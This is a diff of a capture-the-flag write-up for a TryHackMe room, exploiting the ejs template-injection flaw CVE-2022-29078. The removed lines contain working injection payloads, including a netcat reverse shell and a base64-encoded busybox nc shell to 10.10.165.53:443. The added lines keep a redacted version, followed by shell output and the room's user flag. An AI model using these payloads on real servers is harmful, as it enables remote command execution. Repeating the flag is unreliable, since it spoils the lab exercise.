@@ -244,7 +244,6 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 
 &nbsp;&nbsp; [Summary](#0) &nbsp;&nbsp;▪️&nbsp;&nbsp; [Welcome!](#1)&nbsp;&nbsp;▪️&nbsp;&nbsp; [Tyrell Wellick´s Phone Number](#1.1) &nbsp;&nbsp;▪️&nbsp;&nbsp; [User Flag](#1.2) &&nbsp;&nbsp;▪️&nbsp;&nbsp; [Root Flag](#1.3) &nbsp;&nbsp;▪️&nbsp;&nbsp; [Room Complete](#4) &nbsp;&nbsp;▪️&nbsp;&nbsp; [My Journey](#5) &nbsp;&nbsp;
 
-<br>
 <p><strong>CVE-2022-29078</strong>: The ejs (aka Embedded JavaScript templates) package 3.1.6 for Node.js allows server-side template injection in settings[view options][outputFunctionName]. This is parsed as an internal option, and overwrites the outputFunctionName option with an arbitrary OS command (which is executed upon template compilation).
 Base Score: <code>9.8 critical</code></p>
 
@@ -261,26 +260,20 @@ Upgrading <code>ejs</code> to version 3.1.7 or higher</p>
 
 ![image](https://github.com/user-attachments/assets/f583c7d5-b76f-4828-93d3-3ba1aa857ced)
 
+<p>busybox ....</p>
+
 ![image](https://github.com/user-attachments/assets/cbb08e50-5d7c-4216-b366-91d947eb1774)
 
 ![image](https://github.com/user-attachments/assets/77fbdbba-1f0f-4d22-8429-904a4ed6a5c8)
 
+<p>My payload = </p>
 
-http://localhost:3000/page?id=2&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
-
-
-YnVzeWJveCBuYyAxMC4xMC4xNjUuNTMgNDQzIC1lIC9iaW4vYmFzaA==
-
-http://127.0.0.1:3000/?name=John&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('calc');
-
-
-name=Testing&passwords=Testing&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC4xMC4xNjUuNTMgNDQzIC1lIC9iaW4vYmFzaA= | base64 -d | bash"');//
-
+<pre><code> name=Testing&passwords=Testing&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo [REDACTED]= | base64 -d | bash"');//
+</code></pre><br>
 
 ![image](https://github.com/user-attachments/assets/4eb12feb-e70a-4a53-9d45-8a9cd19f26d0)
 
 ![image](https://github.com/user-attachments/assets/7e97bf07-eb1f-4507-8d06-cf7fa015ee22)
-
 
 <pre><code>whoami
 web
@@ -302,7 +295,6 @@ web@cyprusbank:~/app$
 >> <code><strong>THM{4lways_upd4te_uR_d3p3nd3nc!3s}</strong></code>
 <p></p>
 <br>
-
 
 <pre><code>$ web@cyprusbank:~/app$ sudo -l
 Matching Defaults entries for web on cyprusbank:
